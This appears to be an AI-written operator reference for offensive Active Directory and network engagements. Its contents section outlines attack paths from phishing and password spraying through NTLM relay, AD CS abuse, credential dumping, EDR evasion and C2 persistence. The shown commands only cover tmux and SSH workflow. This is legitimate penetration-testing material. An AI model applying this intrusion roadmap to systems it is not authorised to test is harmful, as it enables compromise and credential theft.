# Operator Reference

A working reference for internal network and Active Directory operations, rebuilt from a 2020-era command dump into something that explains mechanism rather than just syntax. Every technique entry aims to cover what it is, why it works, what must be true first, the commands, how to confirm success, what it looks like to a defender, and how it fails.

Commands use consistent placeholders so a single find-and-replace makes them runnable.

| Placeholder | Meaning |
| --- | --- |
| `$ATTACKER` | Your host, listener or callback address |
| `$TARGET` | Single target host, IP or FQDN |
| `$TARGETS` | File or CIDR of targets |
| `$DC` | Domain controller, FQDN preferred for Kerberos |
| `$DOMAIN` | Domain FQDN |
| `$NETBIOS` | Short domain name |
| `$USER` / `$PASS` | Credential pair |
| `$NTHASH` | NT hash |
| `$AESKEY` | AES256 key |
| `$LPORT` | Listener port |
| `$IFACE` | Network interface |

Lines marked with an HTML comment reading VERIFY are ones where the writing agent was not fully confident of exact syntax and flagged it for checking.

## Contents and orientation

This is a long reference. It is organised by *where you are in an engagement*, not by tool and not by MITRE tactic, and it is meant to be entered in the middle rather than read front to back. This section is the map: what each section covers, which section to open given the position you are actually in, and where the authoritative treatment of each recurring concept lives so you are not reading the same idea three times in three places.

Three conventions make navigation work. Every section explains mechanism before syntax, so if a tool has changed since this was written the section still tells you what to rebuild. Every technique that touches a target carries a detection and opsec note, so you can decide what an action costs before you take it. And every technique states its preconditions exactly, so you can rule out most of a section in thirty seconds rather than discovering the blocker after an hour.

### Start here: which sections to read for the position you are in

The single most common failure with a reference this size is opening it at the wrong place. Find the row that describes what you actually hold and read in the order given. The first section named is where to start; the later ones are what you will need next, in the order you will need them.

**You have nothing.** No credential, no network position, no code execution anywhere, just a scope statement and a company name. Start with **Initial Access**, which is the only section written for this position. Work its external reconnaissance and identity reconnaissance material first, because it tells you which of the routes below is even open. Then follow whichever route the reconnaissance opened: **Cloud and Modern Identity** if the estate is Entra-fronted and you are attacking the identity plane, **Evasion and Payload Development** and **Command and Control** if you are building a phishing payload, or **Enterprise Infrastructure** if the productive surface turned out to be an internet-facing appliance. If Initial Access lands you on a wire rather than on a host, go to **Network Enumeration** next.

**You have network access but no credential.** You are plugged into a subnet, or you have a VPN, or the wireless gave you a lease. Read **Network Enumeration** first to find out what is actually there, then **On-Path Attacks: The Modern Approach**, which is the section that tells you how to obtain a credential from a network position in a current estate and, importantly, which of the classic techniques are now dead. Read it before **On-Path and Traffic Attacks**, which holds the full layer 2 and capture toolkit but is a deeper reference rather than a first move. **Active Directory: Enumeration** covers the unauthenticated LDAP, RPC and Kerberos surface and the username discovery and spraying material, which is usually the fastest route from no credential to one credential. **Coercion, Relay and Certificate Abuse** is where a captured or coerced authentication becomes access.

**You have one credential.** A username and password, or a hash, and nothing else. Go to **Active Directory: Enumeration** and collect properly before you touch anything, then **Kerberos Abuse** for roasting, which is the highest-yield thing a single low-privilege credential does. **Coercion, Relay and Certificate Abuse** is next, because AD CS misconfiguration is the most common single-credential-to-domain-admin path in a modern estate and it does not require you to be an administrator anywhere. **Lateral Movement** tells you what your credential material will and will not authenticate to, and is the section that resolves most "the hash did not work" confusion. **Enterprise Services** is worth a pass on any estate with SQL Server or SCCM, both of which regularly hand a single domain credential far more than it should have.

**You have local admin on one box.** Read **Windows Post-Exploitation** first: the credential extraction material is what turns one host into more hosts, and the situational awareness material tells you whether the host is worth anything. Then **Lateral Movement** for what to do with what you extracted, and **Evasion and Payload Development** if the host has an endpoint agent that is going to object. If the box is Linux read **Linux Post-Exploitation** instead, whose credential harvesting material is the equivalent, and whose containers and orchestration material matters if the host runs a runtime. If the box is a Mac read **macOS Post-Exploitation**. **Command and Control** is where you make the foothold durable and comfortable; **Lateral Movement** also holds the pivoting and tunnelling material you will need to reach anything the host can see but you cannot.

**You have domain admin.** The interesting question is no longer access, it is what the domain admin credential is *for*. **Coercion, Relay and Certificate Abuse** holds the AD persistence and dominance material, including the durability comparison that tells you which persistence survives which remediation. **Kerberos Abuse** covers golden and diamond tickets and the long-term key persistence that outlives a password reset. **Enterprise Infrastructure** is usually where the remaining engagement objectives live, because domain admin very often converts directly into hypervisor administrator, backup administrator or network device administrator, and those give you the estate rather than the directory. **Cloud and Modern Identity** matters if the domain is hybrid-joined, because the hybrid seam material converts on-premises dominance into tenant dominance. **Windows Post-Exploitation** holds the DCSync and NTDS material.

**You are in a restricted VDI or published-application session.** Go straight to the VDI and published-application breakout material in **Enterprise Infrastructure**, which is written for exactly this position and covers breakout by mechanism, kiosk and shell replacement escape, and getting tooling in and traffic out of a locked session. **Windows Post-Exploitation** owns the application control material, AppLocker, WDAC and Constrained Language Mode, which is what you will actually be fighting; the Enterprise Infrastructure treatment deliberately cross-references it rather than repeating it. Once you have a shell, you are in the same position as anyone with a domain user on a Windows host, so continue with **Active Directory: Enumeration**.

**You have a cloud token.** An access token, a refresh token, a primary refresh token, a device code you phished, or a set of static cloud keys. Read **Cloud and Modern Identity** and start with its token material, because the whole section rests on the point that the token is the credential and the object of the exercise is to keep being able to mint them. Which half you need depends on the provider: the Entra ID and Azure material for a Microsoft tenant, the AWS, Google Cloud and developer estate material for anything else, including CI/CD and source control. If the token came from a compromised endpoint, the artefact recovery is in **Windows Post-Exploitation**, **Linux Post-Exploitation** or **macOS Post-Exploitation** depending on the host. If the tenant is hybrid, the hybrid seam material runs in both directions and the on-premises half is in **Active Directory: Enumeration** and **Coercion, Relay and Certificate Abuse**.

**You are writing the report.** Most sections end with a summary table of technique, precondition, yield and detection likelihood. Those tables plus the per-technique detection and opsec notes are the raw material for the remediation half of a report, and several sections carry explicit impact framing.

### Section by section

**Foundations and Operator Workflow.** Terminal multiplexing, session logging and evidence capture, the engagement working tree, credential and loot hygiene, shell tricks for a host with nothing installed, and data wrangling for engagement output. Then the tooling landscape: what died since 2020, what replaced it, and migration tables per capability area. Reach for this at the start of an engagement, when you are setting up, and any time a command from an older set of notes returns `command not found`.

**Initial Access.** How you get from a scope statement to code execution or a credential: external attack surface mapping, identity reconnaissance, credential-based access without exploitation, multi-factor authentication as the real obstacle, phishing as an engineering problem, pretext and campaign design, exposed service exploitation, physical and proximity access, and the transition from foothold to established access. Reach for this when the engagement has not started yet, or when you are choosing between routes rather than executing one.

**Network Enumeration.** Host discovery and port scanning as a funnel, the tiering principle, an nmap flag reference, UDP scanning honestly assessed, scanning through a SOCKS proxy, and then service enumeration protocol by protocol: SMB, LDAP, DNS, Kerberos, SNMP, RPC, web services, databases. Reach for this when you have a network position and need to convert a scope into a short list of hosts that matter, and for the triage table that says which port is worth what.

**On-Path and Traffic Attacks.** The layer 2 toolkit in full: reading a segment before touching it, first-hop redundancy protocols as a safety gate, IP forwarding, chunked ARP spoofing, credential harvesting from an on-path position, VLAN hopping, STP, CDP and LLDP, CAM table overflow. Then packet capture and traffic triage with tcpdump and tshark, and the wireless material: WPA2-PSK, WPA3 and transition modes, WPA-Enterprise and PEAP-MSCHAPv2, rogue infrastructure. Reach for this when you need the deep reference on a layer 2 or radio technique, or when you have a capture and need to get credentials out of it.

**Active Directory: Enumeration.** Unauthenticated enumeration, username discovery, password spraying done properly, authenticated LDAP enumeration, group membership subtleties, enumerating from a Windows foothold, and credential stores as an enumeration step. Then BloodHound: the legacy to CE generational shift, collectors, Cypher properly explained, a corrected and curated query library, working a path, and operating without BloodHound. Reach for this immediately after obtaining any domain credential, and whenever you need to know what a principal can actually do.

**Kerberos Abuse.** How Kerberos actually works, encryption types and why they now decide whether roasting is worth doing, Kerberoasting and its targeted variant, AS-REP roasting, roasting without pre-authentication, Timeroasting, and cracking the output. Then delegation in all three forms, unconstrained, constrained and resource-based, and ticket forgery: silver, golden, diamond and sapphire. Reach for this with any domain credential for roasting, and whenever BloodHound or LDAP enumeration surfaces a delegation edge.

**Lateral Movement.** The authentication material taxonomy, which is the section that resolves most first-hop failures, then pass-the-hash, overpass-the-hash and pass-the-key, pass-the-ticket including kirbi and ccache handling, the execution methods ranked by noise, Evil-WinRM in depth, SPN-jacking, and file transfer once you have execution. Then pivoting: the four primitives, SOCKS, layer 3 tunnelling, SSH, reverse tunnelling, multi-hop, and getting your C2 through. Reach for this when you hold credential material and need to turn it into code on another host, or when you can see a target you cannot reach.

**Coercion, Relay and Certificate Abuse.** How NTLM relay works and, more usefully, what now blocks it, the coercion families, WebDAV and the WebClient service, which account authenticates back and why machine accounts matter, relay targets and yields, and the high-value chains end to end. Then the AD CS escalation taxonomy, ESC1 to ESC16, with KB5014754 strong certificate mapping treated as the gate it now is. Then certificate theft, certificate-based persistence, and the wider AD persistence and dominance material: DCSync rights, AdminSDHolder, ACL and GPO persistence, SID history, skeleton key, DSRM, trust-based persistence, and a durability comparison. Reach for this with any domain credential, because AD CS is the highest-yield misconfiguration surface in a modern domain, and reach for the persistence half once you have domain dominance.

**Enterprise Services.** Microsoft SQL Server: logins versus users, impersonation, command execution, linked servers as a lateral movement graph, and coercing the service account. Then SCCM and MECM: architecture, credential extraction, coercion and relay against its authentication flows, site takeover, the administration service, the site database, and code deployment. Then Exchange and mail: discovery, the pre-authentication surface, authenticated mailbox access, Exchange directory rights abuse, mail as a lateral movement and persistence channel, and hybrid and cloud mail. Reach for this on any estate with SQL Server, a deployment platform, or on-premises Exchange, all three of which routinely hold more privilege than the directory suggests.

**Windows Post-Exploitation.** Situational awareness on a new host, token privileges as the central escalation concept, the local privilege escalation surface, UAC and integrity levels, Constrained Language Mode, AppLocker and WDAC, PowerShell as a constrained environment, and share pillaging. Then credential extraction: SAM, LSA secrets, LSASS with dumping approaches ranked by noise, LSA protection and Credential Guard, DPAPI, Kerberos tickets from memory, browser credentials and cookies, cloud authentication artefacts, and DCSync. Then persistence, user-context and elevated, with a durability and detectability comparison. Reach for this the moment you have execution on a Windows host.

**Linux Post-Exploitation.** Host enumeration and local privilege escalation: the enumeration sweep ordered by yield, sudo in depth, SUID and SGID, capabilities, cron and timers, services and sockets, kernel exploits, NFS, and domain-joined enterprise Linux. Then persistence, credential harvesting including cloud CLI caches and Kerberos keytabs, and containers and orchestration: escape paths, service account tokens, pod to node to cluster, admission control bypass, and registry abuse. Reach for this on any Linux foothold, and for the container material whenever a host runs a runtime or you land inside a pod.

**Evasion and Payload Development.** How a modern endpoint agent actually observes you, the detection taxonomy, a layered model of what you must defeat, evasion strategy at the level of principle, AMSI specifically, and interfering with security products. Then payload construction: staged versus stageless, payload anatomy, encoding and obfuscation, packers, loaders, syscalls, msfvenom, and delivery. Reach for this before you drop anything on a monitored host, and whenever something you built is being caught and you need to know which layer caught it.

**Command and Control.** Sliver as the worked example, covering the beacon and session model, transports, profiles and implant generation, staging, running tooling through an implant, the armory, and infrastructure and redirection. Then the wider landscape: framework anatomy, the vocabulary problem, the axes that actually matter when choosing, Cobalt Strike, Havoc, Covenant and Mythic, infrastructure design, traffic shaping, and detecting C2 as a discipline. Reach for this when you are standing up infrastructure, choosing a framework, or deciding how a foothold should call home.

**Cloud and Modern Identity.** Entra ID and Azure: the identity model, tokens as the credential, reconnaissance without credentials, initial access, authenticated enumeration, privilege escalation within the tenant, the hybrid seam, Azure resource attacks, and tenant persistence. Then AWS, Google Cloud and the developer estate: the shared mental model, per-provider credential types and escalation families, cross-cloud concept mapping, the CI/CD and developer estate, federation between a pipeline and a cloud account, and secrets discovery as a discipline. Reach for this with any cloud token or key, on any hybrid estate, and whenever the objective lives in a pipeline rather than in the directory.

**On-Path Attacks: The Modern Approach.** A short, opinionated section arguing that the subnet-wide ARP spoof is the wrong default now, and setting out what to reach for instead: a position in name resolution, coercion in place of interception, DHCPv6 and rogue DNS, DHCP DNS dynamic updates, ADIDNS record injection, and when you genuinely do need to be on-path. Carries a decision table. Reach for this *before* the deeper On-Path and Traffic Attacks section, because it tells you which of those techniques is still worth the risk.

**Enterprise Infrastructure.** Four related target classes that domain admin usually converts into. Virtualisation: vSphere and ESXi, Hyper-V, Proxmox, KVM and libvirt, guest-to-host escape, and the segmentation question. Backup and storage: why backup systems are so productive, credential recovery from backup platforms, restoring your way to what you want, code execution via the platform, and storage infrastructure. Network devices: discovery and fingerprinting, management protocol attacks, configuration extraction and mining, centralised authentication as the high-value target, reconfiguration as an attack, edge devices, load balancers, wireless controllers, and out-of-band management. VDI and published applications: session host anatomy, breakout by mechanism, kiosk escape, Citrix, RDS, Azure Virtual Desktop and Horizon, the platform management plane, and persistence in a non-persistent environment. Reach for this when the engagement objective is not the directory, and specifically reach for the VDI material if you are inside a restricted session.

**macOS Post-Exploitation.** What is genuinely different about macOS, situational awareness, enumeration, privilege escalation, credential extraction including the keychain distinction that determines what is achievable, persistence, enterprise integration and lateral movement including MDM as the real privilege boundary, and getting code to run past Gatekeeper, notarisation and TCC. Reach for this on any Mac foothold, and for the MDM material whenever a mixed estate has a management platform you can reach.

### Cross-cutting technique index

A handful of concepts recur across many sections because they are genuinely load-bearing. For each, one section holds the authoritative explanation and the others apply it in their own context. If you want to *understand* the concept, read the owner. If you want to know what it means for a particular platform, read the others.

**NTLM relay.** Authoritative: **Coercion, Relay and Certificate Abuse**, which explains how NTLM makes relay possible, what now blocks it (SMB signing, LDAP signing and channel binding, Extended Protection), the target matrix and the end-to-end chains. Also touched by: **On-Path Attacks: The Modern Approach**, which gates the whole attack class on those relay controls and tells you to enumerate them first; **On-Path and Traffic Attacks**, for capturing authentication from a network position; **Enterprise Services**, for relaying into Exchange EWS and into SCCM authentication flows; **Active Directory: Enumeration**, which surfaces the signing and channel binding posture during enumeration.

**Coercion.** Authoritative: **Coercion, Relay and Certificate Abuse**, which covers the RPC families, WebDAV and the WebClient service, file-based coercion, and which principal authenticates back. Also touched by: **On-Path Attacks: The Modern Approach**, which argues coercion should replace interception as the default; **Enterprise Services**, for UNC path injection against a SQL Server service account and for SCCM client push; **Enterprise Infrastructure**, where a coerced authentication from an appliance or a session host is often the only credential available.

**Kerberos delegation.** Authoritative: **Kerberos Abuse**, which covers unconstrained, constrained and resource-based delegation, the S4U exchanges, and what Protected Users and the sensitive-account flag do to each. Also touched by: **Coercion, Relay and Certificate Abuse**, where relay to LDAP writes an RBCD edge and where certificate abuse feeds the same primitive; **Active Directory: Enumeration**, which is how you find delegation edges; **Enterprise Infrastructure**, where a live migration relationship is a constrained delegation edge; **macOS Post-Exploitation**, where a bound Mac's computer object participates in the same mechanics.

**DPAPI.** Authoritative: **Windows Post-Exploitation**, which covers the master key hierarchy, user and machine scope, the domain backup key, and offline decryption. Also touched by: **Coercion, Relay and Certificate Abuse**, specifically DPAPI-protected certificate private keys as a theft route; **Enterprise Infrastructure**, where a profile share or a backup image gives you every user's protected material at once; **Enterprise Services**, where the SCCM site database holds DPAPI-protected credentials; **macOS Post-Exploitation**, where the keychain is the analogous problem with a different structure.

**Credential material types.** Authoritative: **Lateral Movement**, whose authentication material taxonomy is the thing to read first, because it states exactly what a password, an NT hash, an AES key, a TGT, a service ticket and a certificate will each authenticate to and which protocols reject which. Also touched by: **Windows Post-Exploitation**, for where each type is stored and how it is extracted; **Kerberos Abuse**, for converting between them; **Coercion, Relay and Certificate Abuse**, for the certificate-to-TGT-to-NT-hash conversion that makes AD CS abuse so valuable; **Cloud and Modern Identity**, for the token equivalents.

**Application control bypass.** Authoritative: **Windows Post-Exploitation**, covering Constrained Language Mode, AppLocker and WDAC, what each actually enforces, and how they differ in what a bypass requires. Also touched by: **Enterprise Infrastructure**, where the VDI material distinguishes a genuine WDAC refusal from a shell policy dialog, which is the distinction that decides whether you need a bypass at all; **Evasion and Payload Development**, for the payload-format consequences; **Command and Control**, for what an implant can and cannot do inside a constrained environment.

**Token theft and impersonation.** Authoritative: **Windows Post-Exploitation**, which treats token privileges as the central privilege escalation concept and covers impersonation, the potato family, and integrity levels. Also touched by: **Command and Control**, for the crucial and frequently missed point that token operations are process-scoped, so a tool run in a sacrificial process gains you nothing unless you steal its token or migrate; **Lateral Movement**, for turning an impersonated context into remote execution; **Enterprise Services**, for SQL Server impersonation, which is a different mechanism with the same name.

**Name resolution poisoning.** Authoritative: **On-Path Attacks: The Modern Approach**, which is the current view: what still works, what is now mostly dead, and the preference order. Also touched by: **On-Path and Traffic Attacks**, for the full LLMNR, NBT-NS, mDNS, WPAD and DHCPv6 toolkit and the layer 2 context; **Active Directory: Enumeration**, which treats poisoning as one credential source among several and puts it in the enumeration workflow.

**Application control on the credential store: LSASS protection.** Authoritative: **Windows Post-Exploitation**, covering LSA protection, RunAsPPL and Credential Guard, and what each removes from your options. Also touched by: **Evasion and Payload Development**, for the process access telemetry that makes the attempt visible; **Kerberos Abuse** and **Lateral Movement**, for what you do instead when memory is off the table.

**Certificates as credentials.** Authoritative: **Coercion, Relay and Certificate Abuse**, all three of its parts. Also touched by: **Windows Post-Exploitation**, for certificate-based persistence as a credential that survives a password reset; **Enterprise Infrastructure**, where an appliance or a network device enrolling from the enterprise CA is worth checking against the escalation taxonomy; **macOS Post-Exploitation**, for certificates issued to managed Macs.

**Hybrid identity.** Authoritative: **Cloud and Modern Identity**, whose hybrid seam material runs in both directions, on-premises to tenant and tenant to on-premises. Also touched by: **Active Directory: Enumeration** and **Coercion, Relay and Certificate Abuse**, for the on-premises half; **Enterprise Services**, for the hybrid Exchange relationship specifically; **Windows Post-Exploitation**, for recovering cloud authentication artefacts from an endpoint.

**Detection and opsec.** There is no single owner because every technique carries its own note, but **Evasion and Payload Development** holds the theory: how endpoint agents observe, what the detection taxonomy is, and which layer catches what. Read it once and every other section's detection note becomes shorter to interpret. **Command and Control** holds the network-side equivalent, detecting C2 as a discipline, which is the frame for every infrastructure decision.



# Foundations and Operator Workflow

## How to read this document

Every command in this reference uses a fixed set of placeholders so that a single find-and-replace makes a block runnable. `$ATTACKER` is your host, the listener or callback address. `$TARGET` is one target, `$TARGETS` a file or CIDR of them. `$DC` is a domain controller, given as an FQDN because Kerberos SPN construction and referral chasing both depend on DNS resolving that name. `$DOMAIN` is the domain FQDN and `$NETBIOS` its short form. `$USER` and `$PASS` are a credential pair, `$NTHASH` an NT hash, `$AESKEY` an AES256 key, `$LPORT` a listener port and `$IFACE` a network interface. Where a value genuinely must be a literal, it appears as a literal and the prose says why.

Anything that touches a target is written as a seven part entry: what the technique is and what it gets you, why it works at the protocol or OS level, the exact preconditions, the commands, how to verify success rather than assume it, the detection and opsec surface, and the specific failure modes with what each error actually means. Trivial one liners and local workflow items skip the sections that do not apply. The mechanism section is the important one: tools rot on a two year cycle and flags change under you, so the intent is that you can rebuild a technique from first principles when the current implementation breaks.

Keyboard notation follows the multiplexer convention used below. `C-b` means hold Control and press b. `M-w` means Alt (Meta) and w. A sequence written `C-b [` means press the prefix, release it, then press the next key. Windows and PowerShell content uses `Win`, `Shift` and so on spelled out.

## Terminal multiplexing for long running operations

A terminal multiplexer decouples the lifetime of a process from the lifetime of the connection you started it over. On an engagement this is not a convenience, it is the difference between a six hour password spray surviving a VPN renegotiation and losing the spray, the output, and any record of which accounts you already touched. Every long running thing you start should be started inside a multiplexer, without exception, including the ones you expect to take thirty seconds.

### Why the connection is the fragile part

When you SSH into a jump box, your shell is the child of an sshd session and its controlling terminal is a pty on the far end of that TCP connection. Kill the connection and the kernel delivers `SIGHUP` to the foreground process group. Anything that has not detached, ignored the signal, or been placed in a new session dies. `nohup` and `disown` handle the signal but do nothing about the output: you lose the terminal, so you lose the scrollback, the interactive prompt, and any chance of typing into the process again. That matters more than it sounds, because a large fraction of offensive tooling is interactive at exactly the wrong moment: a C2 console, an `evil-winrm` session, an `impacket` prompt, a `mysql` client mid query, anything that pauses to ask "are you sure".

A multiplexer solves this properly by putting the pty on the server side. The multiplexer server process owns the pty, your client merely renders it. The client can die, reconnect from a different IP, or be replaced by a colleague's client, and the process inside never notices. The practical consequences:

- A dropped connection costs you nothing. Reattach and the scrollback is intact.
- You can close your laptop, travel, and pick the same shells back up.
- A long scan and an interactive shell coexist without one blocking the other.
- Output that would otherwise be lost to a disconnect is still on screen to be captured into evidence.

### The object model, and the vocabulary the old notes got wrong

The single most common confusion in tmux write ups, including the source these notes replace, is using "pane" and "window" interchangeably. They are different objects with different keybinds, and mixing them up means half the keys you press do something you did not intend.

| Object | What it is | Lifetime |
| --- | --- | --- |
| Server | One background `tmux` process per socket, owns everything | Started implicitly by the first command, dies when the last session ends |
| Session | A named collection of windows, the unit you attach to and detach from | Independent of any client |
| Window | One full screen tab inside a session, has a name and an index | Dies when its last pane exits |
| Pane | A rectangular split inside a window, each with its own pty and shell | Dies when its shell exits |

So: a session contains windows, a window contains panes, and a pane is where a process actually runs. `C-b c` creates a **window**, not a pane. `C-b %` and `C-b "` create **panes** by splitting the current window. `C-b d` detaches the whole **session**. `C-b x` kills a **pane**, `C-b &` kills a **window**. The source's table labelled window creation as "Create New Pane" and window navigation as pane navigation, which is why following it feels like the keys are broken.

A useful mental model: sessions map to engagements or to phases of one, windows map to tasks, panes map to things you want to watch side by side.

### Attaching, detaching, and the discipline around it

```bash
tmux new -s recon                 # create and attach
tmux new -d -s recon              # create detached, do not attach
tmux new -A -s recon              # attach if it exists, otherwise create
tmux ls                           # list sessions
tmux attach -t recon              # attach to a named session
tmux attach                       # attach to the most recently used session
tmux a                            # same, short form
tmux attach -d -t recon           # attach and detach any other client first
tmux kill-session -t recon
tmux kill-server                  # everything, all sessions
tmux has-session -t recon 2>/dev/null || tmux new -d -s recon
```

`tmux new -A -s NAME` is the form to use in scripts and in your shell profile: idempotent, no error if the session already exists, no accidental second session called `recon-1` that you forget about and later find holding the shell you needed.

The `-d` on attach matters when two clients share a session. By default multiple clients can attach to the same session simultaneously, and the display is sized to the smallest client, so a colleague attaching from an 80 column terminal shrinks your view. `attach -d` evicts them. If you actually want to share, that is covered below.

Detach discipline is simple and worth making a habit:

- Detach with `C-b d` rather than closing the terminal. Closing the terminal usually works, but if the client is wedged you can end up with a stale client holding the session size.
- Never run anything that outlives a keystroke outside a session. If you find yourself typing a command and then thinking "this will take a while", `C-b` then `:` then `new-window` first, or press `C-z` and use `disown` only as a last resort.
- Name sessions after the engagement, not after nothing. `tmux ls` showing `0: 3 windows` and `1: 7 windows` after a week is useless.
- Rename windows as you go with `C-b ,`. A window called `spray`, one called `bh`, one called `c2` is navigable. Twelve windows called `bash` is not.

### Window and pane keys

Prefix is `C-b` by default. Everything below assumes the prefix has been pressed and released first.

| Key | Action | Object |
| --- | --- | --- |
| `c` | Create window | window |
| `,` | Rename current window | window |
| `&` | Kill current window (prompts) | window |
| `n` / `p` | Next / previous window | window |
| `0`..`9` | Select window by index | window |
| `l` | Last used window | window |
| `w` | Interactive session and window tree | window |
| `f` | Find window by text in its panes | window |
| `.` | Move window to a new index | window |
| `$` | Rename session | session |
| `d` | Detach session | session |
| `s` | Interactive session chooser | session |
| `(` / `)` | Previous / next session | session |
| `%` | Split into left and right panes | pane |
| `"` | Split into top and bottom panes | pane |
| Arrow keys | Move to the pane in that direction | pane |
| `o` | Cycle to next pane | pane |
| `q` | Show pane numbers, press a number to jump | pane |
| `x` | Kill current pane (prompts) | pane |
| `z` | Zoom pane to full window, press again to restore | pane |
| `!` | Break current pane out into its own window | pane |
| `{` / `}` | Swap pane with previous / next | pane |
| `C-arrow` | Resize pane in that direction | pane |
| `Space` | Cycle through preset layouts | pane |
| `[` | Enter copy mode | copy |
| `]` | Paste the most recent buffer | copy |
| `#` | List paste buffers | copy |
| `=` | Interactive buffer chooser, paste the selection | copy |
| `t` | Big clock, surprisingly useful for timestamping a screenshot | misc |
| `?` | List every binding currently in effect | misc |
| `:` | tmux command prompt | misc |
| `C-b` | Send a literal prefix through to a nested tmux | misc |

`C-b z` is the single most underused key. Zooming a pane to full window and back means you can keep a four pane monitoring layout and still read a wide `nmap` line without resizing anything.

`C-b !` is the escape hatch when a pane you split off casually turns into the main event: break it out into its own window, name it, and stop squinting.

Nested tmux, a local session containing an SSH connection to a jump box that is itself running tmux, is normal. The inner session never sees your prefix because the outer one consumes it. `C-b C-b` sends one literal prefix inward, so `C-b C-b c` creates a window in the inner session. If you nest often, give the outer session a different prefix (`C-a`) so you stop thinking about it.

### Copy mode and buffers

Copy mode is a pager over the pane's scrollback plus a selection mechanism. `C-b [` enters it, `q` leaves it. The keys inside depend on the `mode-keys` option, which defaults to emacs unless your `VISUAL` or `EDITOR` contains `vi`. That is why key tables copied off the internet disagree with each other. Set it explicitly and stop guessing.

| Action | vi mode | emacs mode |
| --- | --- | --- |
| Scroll up / down a page | `C-b` / `C-f` | `PageUp` / `PageDown` |
| Scroll a line | `k` / `j` | `C-p` / `C-n` |
| Top / bottom of history | `g` / `G` | `M-<` / `M->` |
| Search backwards through scrollback | `?` | `C-r` |
| Search forwards | `/` | `C-s` |
| Repeat search | `n` / `N` | `n` / `N` |
| Start selection | `Space` or `v` if bound | `Space` |
| Copy selection and exit | `Enter` or `y` if bound | `M-w` |
| Rectangular selection toggle | `C-v` | `R` |
| Cancel | `q` | `C-g` |

Searching backwards is the thing to internalise. After a long scan you do not scroll, you enter copy mode and search for `open` or for the hostname you care about.

Buffers are tmux's own clipboard stack, entirely separate from the system clipboard. Anything you copy in copy mode lands in buffer 0 and older buffers shift down. The command line side of that is where the operational value is:

```bash
tmux list-buffers                          # what is in the stack
tmux show-buffer                           # print the newest buffer to stdout
tmux save-buffer -b 0 /path/loot.txt       # write a buffer to a file
tmux load-buffer /path/wordlist-snippet    # push a file into the buffer stack
tmux capture-pane -p -S -                  # dump the entire scrollback of the current pane to stdout
tmux capture-pane -p -S -10000 -J          # last 10000 lines, -J rejoins wrapped lines
tmux capture-pane -t recon:scan.1 -p -S - > logs/scan-scrollback.txt
```

`capture-pane -p -S -` is the recovery command for the situation where you ran something important without logging it. The scrollback is still in the tmux server's memory, so dump it to a file before it scrolls out. `-J` matters if you intend to grep the result, because without it a long line that wrapped on screen is stored as multiple lines with the break in the middle of an IP address. Raise `history-limit` before you need it, not after.

Getting text out to your actual laptop clipboard across SSH is the other half of this. tmux can emit OSC 52 clipboard escape sequences, which the terminal emulator on your local machine intercepts and writes into the real clipboard, so copying inside a remote tmux populates your local clipboard with no X forwarding at all:

```text
set -g set-clipboard on
```

This needs your local terminal to support and allow OSC 52. Most current emulators do, some require enabling it explicitly. Where it is unavailable, pipe to a local clipboard tool instead, `pbcopy` on macOS, `xclip -selection clipboard` on X11, `wl-copy` on Wayland.

### Synchronised panes for parallel host work

`synchronize-panes` broadcasts your keystrokes to every pane in the current window at once. For interactive triage across a handful of similar hosts it is genuinely the fastest tool available: split into four panes, SSH into four boxes, turn sync on, and type `id; uname -a; ss -tlnp` once.

```bash
tmux setw synchronize-panes on
tmux setw synchronize-panes off
tmux setw synchronize-panes            # toggle
```

Bind it, and make the binding tell you the current state, because the failure mode is destructive:

```text
bind C-s setw synchronize-panes \; display "sync #{?pane_synchronized,ON,OFF}"
set -g pane-active-border-style 'fg=colour46'
```

The obvious trap: sync on plus a pane that is not what you think it is equals a command run somewhere unintended. The specific version of that which ruins an afternoon is one pane still sitting at a root shell on a production host while the other three are on your own boxes. Turn it off the moment the parallel bit is done, and never leave a window with sync enabled and no visual indicator.

Sync is for interactive work only. Anything repeatable should be a loop, not broadcast typing, because a loop is logged, reviewable, and rerunnable:

```bash
xargs -a targets.txt -P 10 -I{} sh -c 'ssh -o BatchMode=yes {} "id; uname -a" > logs/hosts/{}.txt 2>&1' 
parallel --joblog logs/parallel.log -j 10 -a targets.txt 'ssh {} uname -a'
```

For the middle ground, `parallel-ssh` (the `pssh` suite) runs one command across a host file with per host output directories, and `tmux-xpanes` builds a tmux window with one pane per argument, which is synchronised panes without the manual splitting:

```bash
xpanes -c 'ssh {}' host1 host2 host3 host4
pssh -h targets.txt -o logs/pssh -i 'id'
```

### Persistence, resurrection, and what a multiplexer does not survive

A tmux session survives your client disconnecting. It does not survive the tmux server dying, and the server dies when the machine reboots, when it is OOM killed, or when someone runs `tmux kill-server`. Nothing in the pty is on disk. This is worth stating plainly because operators routinely treat tmux as durable storage for a week of work.

Two mitigations, and they address different problems.

**Resurrect layouts.** The `tmux-resurrect` plugin serialises sessions, windows, panes, layouts, working directories and optionally the running programs to a file, and `tmux-continuum` calls that save on a timer and can restore on server start. Installed through `tpm`, the tmux plugin manager:

```text
set -g @plugin 'tmux-plugins/tpm'
set -g @plugin 'tmux-plugins/tmux-resurrect'
set -g @plugin 'tmux-plugins/tmux-continuum'
set -g @continuum-restore 'on'
set -g @continuum-save-interval '15'
set -g @resurrect-capture-pane-contents 'on'
run '~/.tmux/plugins/tpm/tpm'
```

`prefix C-s` saves and `prefix C-r` restores. Understand the limit: it restores the shape of your workspace and, with `@resurrect-capture-pane-contents`, the visible text. It does not restore process state. Your C2 server is not resurrected, your half typed `bloodyAD` command is not resurrected, and an SSH session is only "restored" in the sense that it can rerun the command line. Treat it as a way to avoid rebuilding a twelve pane layout, not as checkpointing.

**Do not depend on memory for evidence.** Everything valuable should already be on disk because you are logging, which is covered under session logging and evidence capture below. Resurrect is comfort, logging is the actual control.

Zellij takes a different approach and serialises session state itself, so `zellij attach` after a reboot can bring the layout back without a plugin. The same caveat about process state applies.

### A minimal sane .tmux.conf for operators

Long configs are a liability on engagement because you will end up on a jump box without yours. Keep it short enough that you can retype the parts that matter. This is a defensible baseline, every line earns its place:

```text
# Prefix: C-a is faster to reach and frees C-b for readline. Keep C-b working too.
set -g prefix C-a
bind C-a send-prefix
bind-key C-b send-prefix

# Scrollback deep enough that a full nmap run is still recoverable
set -g history-limit 200000

# Index from 1: the keys 1-9 are adjacent, 0 is not
set -g base-index 1
setw -g pane-base-index 1
set -g renumber-windows on

# Splits that keep the current directory, and mnemonic keys
bind | split-window -h -c "#{pane_current_path}"
bind - split-window -v -c "#{pane_current_path}"
bind c new-window -c "#{pane_current_path}"

# Reload without restarting
bind r source-file ~/.tmux.conf \; display "config reloaded"

# vi keys in copy mode, chosen explicitly rather than inherited from $EDITOR
setw -g mode-keys vi
